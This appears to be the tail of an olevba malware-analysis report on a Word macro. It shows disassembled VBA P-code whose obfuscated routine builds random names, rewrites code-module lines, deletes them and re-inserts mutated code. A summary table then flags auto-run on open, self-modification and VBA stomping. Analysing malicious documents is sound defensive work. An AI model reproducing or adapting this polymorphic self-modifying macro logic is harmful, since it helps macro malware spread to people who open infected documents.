' 	LitDI2 0x0014 
' 	Mul 
' 	Coerce (Int) 
' 	St êµ—èùÙ×ß¹Èö¶ˆ£ 
' Line #108:
' 	StartForVariable 
' 	Ld ‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld êµ—èùÙ×ß¹Èö¶ˆ£ 
' 	For 
' Line #109:
' 	Label àïÃ¼†¸ 
' Line #110:
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St Ü¿ŠÏ‘Ô´˜ð 
' Line #111:
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo àïÃ¼†¸ 
' 	EndIf 
' Line #112:
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	LitDI2 0x0022 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo àïÃ¼†¸ 
' 	EndIf 
' Line #113:
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo àïÃ¼†¸ 
' 	EndIf 
' Line #114:
' 	Ld °Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘ 
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St °Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘ 
' Line #115:
' 	StartForVariable 
' 	Ld ‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­ 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld  Ü 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld °Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	LitDI2 0x0001 
' 	Ld ‡Óµ½’ùé„�� 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ßùŽ äÙ‡áÕÄ­Åò 
' Line #119:
' 	StartForVariable 
' 	Ld Š 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ßùŽ äÙ‡áÕÄ­Åò 
' 	For 
' Line #120:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld Š 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ‡Óµ½’ùé„�� 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' Line #121:
' 	StartForVariable 
' 	Ld Š 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	Ld ™•µŒð�ÑâˆâàÝ÷ß 
' 	LitDI2 0x00A9 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢…… 
' 	EndIf 
' Line #123:
' 	Do 
' Line #124:
' 	LitDI2 0x0000 
' 	St ³‘êîˆÈ�óøÎÎ¿Íï 
' Line #125:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	FnLen 
' 	St ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' Line #126:
' 	Ld À½ 
' 	LitDI2 0x0001 
' 	Add 
' 	St À½ 
' Line #127:
' 	Ld À½ 
' 	LitDI2 0x0001 
' 	ArgsLd ƒê¶—Ð 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢…… 
' 	EndIf 
' Line #128:
' 	Ld À½ 
' 	LitDI2 0x0001 
' 	ArgsLd ƒê¶—Ð 0x0002 
' 	FnLen 
' 	St Ê®· 
' Line #129:
' 	Ld À½ 
' 	LitDI2 0x0001 
' 	ArgsLd ƒê¶—Ð 0x0002 
' 	St êµ—èùÙ×ß¹Èö¶ˆ£ 
' Line #130:
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	Ld ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' 	Eq 
' 	DoUnitil 
' Line #131:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	FnLen 
' 	St ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' Line #132:
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	LitDI2 0x0001 
' 	Add 
' 	St ³‘êîˆÈ�óøÎÎ¿Íï 
' Line #133:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	Ld Ê®· 
' 	ArgsLd Mid$ 0x0003 
' 	St ­Úé÷Éï²»ú¢§ö�‡ÚÌ‰ 
' Line #134:
' 	Ld ­Úé÷Éï²»ú¢§ö�‡ÚÌ‰ 
' 	ArgsLd UCase 0x0001 
' 	Ld êµ—èùÙ×ß¹Èö¶ˆ£ 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #135:
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #136:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	Ld Ê®· 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' Line #137:
' 	LitDI2 0x0000 
' 	St ™Ìòç¿ð×—¤ 
' Line #138:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #139:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0061 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #140:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x007A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #141:
' 	Ld ™Ìòç¿ð×—¤ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #142:
' 	Ld ç¨œ»Ö¦Ýð 
' 	Ld À½ 
' 	LitDI2 0x0002 
' 	ArgsLd ƒê¶—Ð 0x0002 
' 	Concat 
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	Ld Ê®· 
' 	Add 
' 	Ld ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St ç¨œ»Ö¦Ýð 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	ElseBlock 
' Line #145:
' 	LitDI2 0x0000 
' 	St ™Ìòç¿ð×—¤ 
' Line #146:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' Line #147:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #148:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0061 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #149:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x007A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #150:
' 	Ld ™Ìòç¿ð×—¤ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #151:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	Ld Ê®· 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' Line #152:
' 	LitDI2 0x0000 
' 	St ™Ìòç¿ð×—¤ 
' Line #153:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #154:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0061 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #155:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x007A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ™Ìòç¿ð×—¤ 
' 	EndIf 
' Line #156:
' 	Ld ™Ìòç¿ð×—¤ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #157:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	LitDI2 0x0001 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St ç¨œ»Ö¦Ýð 
' Line #158:
' 	Ld ç¨œ»Ö¦Ýð 
' 	Ld À½ 
' 	LitDI2 0x0002 
' 	ArgsLd ƒê¶—Ð 0x0002 
' 	Concat 
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Ld ³‘êîˆÈ�óøÎÎ¿Íï 
' 	Ld Ê®· 
' 	Add 
' 	Ld ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St ç¨œ»Ö¦Ýð 
' Line #159:
' 	Ld ç¨œ»Ö¦Ýð 
' 	St §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Loop 
' Line #165:
' 	Loop 
' Line #166:
' 	Label ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢…… 
' Line #167:
' 	LitDI2 0x0001 
' 	Ld �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' Line #168:
' 	LitDI2 0x0001 
' 	Ld ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' 	LitDI2 0x0001 
' 	Ld �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #169:
' 	Ld §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #170:
' 	EndSub 
' Line #171:
' Line #172:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

